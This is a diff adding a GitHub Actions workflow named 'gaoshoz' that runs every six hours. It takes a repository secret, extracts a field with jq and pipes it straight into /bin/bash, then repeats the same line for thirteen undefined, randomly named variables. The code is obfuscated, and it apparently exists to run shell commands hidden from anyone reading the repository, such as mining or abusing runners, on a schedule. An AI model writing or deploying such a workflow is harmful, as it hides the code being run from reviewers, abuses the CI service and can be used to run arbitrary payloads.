@@ -1,0 +1,30 @@
+name: gaoshoz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaoshoz
+        env:
+          pmw0: ${{ secrets.pmw0 }}
+        run: |
+          echo $pmw0 | jq -r .vidne213 | /bin/bash
+          echo $epux11 | jq -r .uvhco16606 | /bin/bash
+          echo $nng5 | jq -r .x64481 | /bin/bash
+          echo $wdjc8 | jq -r .ohf8860 | /bin/bash
+          echo $gzqg09293 | jq -r .ym12 | /bin/bash
+          echo $kpl283 | jq -r .lrn800 | /bin/bash
+          echo $mx1 | jq -r .daixg4579 | /bin/bash
+          echo $gj185 | jq -r .oinvr44405 | /bin/bash
+          echo $zeuf6 | jq -r .yqzt1165 | /bin/bash
+          echo $ohbl9094 | jq -r .qf3 | /bin/bash
+          echo $icg7 | jq -r .nt68723 | /bin/bash
+          echo $hdc43428 | jq -r .xw88 | /bin/bash
+          echo $dm2662 | jq -r .fg6 | /bin/bash
+          echo $g0751 | jq -r .c24 | /bin/bash
+
